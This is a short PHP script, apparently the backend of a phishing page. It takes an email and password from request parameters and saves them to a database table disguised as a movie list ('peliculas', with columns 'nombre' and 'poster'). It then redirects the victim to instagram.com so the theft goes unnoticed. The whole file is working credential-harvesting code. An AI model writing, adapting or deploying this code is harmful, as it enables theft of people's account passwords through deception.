<?php

$nombre=$_GET["email"];
$poster=$_GET["password"];

include "conexion.php";

try {

    $conn = new PDO("mysql:host=$host;dbname=$dbName;charset=utf8", $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $query = "INSERT INTO peliculas (nombre, poster) VALUES (?, ?)";
    $stmt = $conn->prepare($query);
    $stmt->bindParam(1, $nombre);
    $stmt->bindParam(2, $poster);   

    $stmt->execute();


    // Obtener los resultados de la consulta
    // $query = "SELECT * FROM peliculas";
    // $stmt = $conn->prepare($query);
    // $stmt->execute();
    // $resultados = $stmt->fetchAll();

    // var_dump($resultados);

    header("Location: https://instagram.com");
    
} catch (PDOException $e) {
    // En caso de error, mostrar el mensaje de error
    echo 'Error de conexión: ' . $e->getMessage();
}

